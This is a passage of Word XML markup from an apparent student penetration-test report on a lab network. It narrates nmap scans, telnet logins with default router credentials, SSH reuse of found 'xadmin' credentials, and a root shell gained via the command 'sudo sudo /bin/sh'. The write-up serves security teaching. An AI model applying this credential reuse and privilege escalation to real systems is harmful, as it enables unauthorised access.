                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D8F67D" w14:textId="38289F2D" w:rsidR="00CA2F7F" w:rsidRPr="00521489" w:rsidRDefault="00CA2F7F" w:rsidP="00CA2F7F">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure 19. telnet ip route for </w:t>
      </w:r>
      <w:r w:rsidR="00F12E2C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the second </w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>router.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBE355D" w14:textId="0A0182EE" w:rsidR="00F12E2C" w:rsidRPr="00521489" w:rsidRDefault="00F12E2C" w:rsidP="00F12E2C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The second router appear</w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to be connected to </w:t>
      </w:r>
      <w:r w:rsidR="00E1180A" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3 other devices.  These IP addresses are as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A38F3A7" w14:textId="7C2AC6ED" w:rsidR="00E1180A" w:rsidRPr="00521489" w:rsidRDefault="00E1180A" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">192.168.0.32 – eth1 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5993474E" w14:textId="29F7214C" w:rsidR="00E1180A" w:rsidRPr="00521489" w:rsidRDefault="00E1180A" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>192.168.0.224 – eth3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B27C7D" w14:textId="1D39FBA7" w:rsidR="00E1180A" w:rsidRPr="00521489" w:rsidRDefault="00E1180A" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>192.168.0.228 – eth2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8C8049" w14:textId="143F9F84" w:rsidR="00E1180A" w:rsidRPr="00521489" w:rsidRDefault="00E1180A" w:rsidP="00E1180A">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">A nmap scan </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> conducted onto the device connected to eth1, revealing two more IP addresses, one of which </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> connected to a second PC.  This secondary PC </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> configured to the IP address 192.168.0.34 as shown in Figure 20.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BB70DA" w14:textId="3694B164" w:rsidR="00CA2F7F" w:rsidRPr="00521489" w:rsidRDefault="00CA2F7F" w:rsidP="00CA2F7F">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5BD58A52" wp14:editId="7BE5B66F">
            <wp:extent cx="3491230" cy="1967230"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="3604635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1230" cy="1967230"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="46EFB3D4" w14:textId="2ACC16CB" w:rsidR="00CA2F7F" w:rsidRPr="00521489" w:rsidRDefault="00CA2F7F" w:rsidP="00CA2F7F">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 20. PC2 nmap result.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D81C7B4" w14:textId="2EC5B508" w:rsidR="00E1180A" w:rsidRPr="00521489" w:rsidRDefault="00E1180A" w:rsidP="00E1180A">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Using the credentials for xadmin that were found on the first PC, the tester </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> log into the ssh on PC2 as shown in Figure 21. When looking at the ifconfig of the xadmin account, the tester discover</w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>another connected device aside the second router to PC2, a directly connected PC under the IP address 13.13.13.12.</w:t>
      </w:r>
      <w:r w:rsidR="00426AC2" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Attempting to mount PC2 onto the kali machine prov</w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r w:rsidR="00426AC2" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> unsuccessful, implying that proper security measures have been applied to deny access to the connected PC. Using Metasploit to port forward toward the PC also </w:t>
      </w:r>
      <w:r w:rsidR="00A668BB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">proved </w:t>
      </w:r>
      <w:r w:rsidR="00426AC2" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>futile,</w:t>
      </w:r>
      <w:r w:rsidR="00116D68" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> however when research Linux </w:t>
      </w:r>
      <w:r w:rsidR="009B16E9" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>privile</w:t>
      </w:r>
      <w:r w:rsidR="00DA4402" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ge escalation</w:t>
      </w:r>
      <w:r w:rsidR="00BF103C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00730D22" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the tester discover</w:t>
      </w:r>
      <w:r w:rsidR="00A668BB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00730D22" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> “sudo sudo </w:t>
      </w:r>
      <w:r w:rsidR="00524803" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/bin/sh”</w:t>
      </w:r>
      <w:r w:rsidR="00EC5779" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, which gave full access to the third PC</w:t>
      </w:r>
      <w:r w:rsidR="00426AC2" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C323A1" w14:textId="48F2E48B" w:rsidR="00CA2F7F" w:rsidRPr="00521489" w:rsidRDefault="00D37451" w:rsidP="00CA2F7F">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3A2A2BA0" wp14:editId="4B20EB62">
            <wp:extent cx="4177030" cy="4093845"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="1100712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7030" cy="4093845"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D29F849" w14:textId="327A727F" w:rsidR="00D37451" w:rsidRPr="00521489" w:rsidRDefault="00D37451" w:rsidP="00CA2F7F">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure 21. SSH </w:t>
      </w:r>
      <w:r w:rsidR="003464B3" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>of PC2 using login found in router 1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FB25E3" w14:textId="3C6C26FE" w:rsidR="000A763B" w:rsidRPr="00521489" w:rsidRDefault="000A763B" w:rsidP="00CA2F7F">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C20AEE6" wp14:editId="266F8E5D">
            <wp:extent cx="5943600" cy="4278630"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="18456417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1736" name="Picture 1" descr="A computer screen shot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId35"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="4278630"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6468253E" w14:textId="552207A6" w:rsidR="000A763B" w:rsidRPr="00521489" w:rsidRDefault="000A763B" w:rsidP="00CA2F7F">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 22. Access to PC3 with all connected devices.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7645289B" w14:textId="77777777" w:rsidR="003464B3" w:rsidRPr="00521489" w:rsidRDefault="003464B3" w:rsidP="003464B3">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="232B9932" w14:textId="3C7251BB" w:rsidR="005E001F" w:rsidRPr="00521489" w:rsidRDefault="005E001F" w:rsidP="005E001F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc183984556"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Router </w:t>
      </w:r>
      <w:r w:rsidR="00E91521" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="76D9BBC3" w14:textId="25B3173D" w:rsidR="00426AC2" w:rsidRPr="00521489" w:rsidRDefault="00426AC2" w:rsidP="00426AC2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>During the telnet scan, another router appear</w:t>
      </w:r>
      <w:r w:rsidR="00A668BB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">to be connected to Router 2 through the eth2 port.  A nmap scan </w:t>
      </w:r>
      <w:r w:rsidR="00A668BB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s conducted onto this device, where a router </w:t>
      </w:r>
      <w:r w:rsidR="00A668BB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s found on the IP address.  Utilizing the telnet vyos credentials once more, the tester </w:t>
      </w:r>
      <w:r w:rsidR="00A668BB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>finds</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the IP routing for the network as shown in Figure 23. The devices connected to this third router are as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04532F14" w14:textId="6A30422B" w:rsidR="00426AC2" w:rsidRPr="00521489" w:rsidRDefault="00426AC2" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>192.168.0.12/27 – eth1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECF6C0D" w14:textId="0D639BF7" w:rsidR="00426AC2" w:rsidRPr="00521489" w:rsidRDefault="00426AC2" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>192.168.0.2</w:t>
      </w:r>
      <w:r w:rsidR="00011B32" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>30</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/30 – eth3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F7C272" w14:textId="69C94A32" w:rsidR="00426AC2" w:rsidRPr="00521489" w:rsidRDefault="00426AC2" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>192.168.0.23</w:t>
      </w:r>
      <w:r w:rsidR="00FF2C32" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/30 – eth2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34AC6F7B" w14:textId="54698871" w:rsidR="003464B3" w:rsidRPr="00521489" w:rsidRDefault="00DE4B32" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58322614" wp14:editId="3DADECFD">
            <wp:extent cx="3588385" cy="2174875"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1782850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8385" cy="2174875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="082295F2" w14:textId="4333D7DF" w:rsidR="00DE4B32" w:rsidRPr="00521489" w:rsidRDefault="00DE4B32" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="000A763B" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. nmap </w:t>
      </w:r>
      <w:r w:rsidR="004C2C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>192.</w:t>
      </w:r>
      <w:r w:rsidR="004C2C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>168.0.230 router.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1413573A" w14:textId="421AF57F" w:rsidR="004C2C62" w:rsidRPr="00521489" w:rsidRDefault="004C2C62" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4509B4F0" wp14:editId="6CE5AC96">
            <wp:extent cx="4156075" cy="4460875"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="787078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6075" cy="4460875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="498BEA40" w14:textId="3C76C29E" w:rsidR="004C2C62" w:rsidRPr="00521489" w:rsidRDefault="004C2C62" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. telnet of 192.168.0.230 router.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E7B484" w14:textId="17D57926" w:rsidR="00426AC2" w:rsidRPr="00521489" w:rsidRDefault="00426AC2" w:rsidP="00426AC2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The tester conduct</w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a simple nmap scan onto the device connected to the eth1 port and reveal</w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>another PC on the IP address 192.168.0.130.  PC</w:t>
      </w:r>
      <w:r w:rsidR="000B61E7" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> thus mounted to determine if any logins could be found, revealing an xadmin login running as shown in Figure 26.</w:t>
      </w:r>
    </w:p>
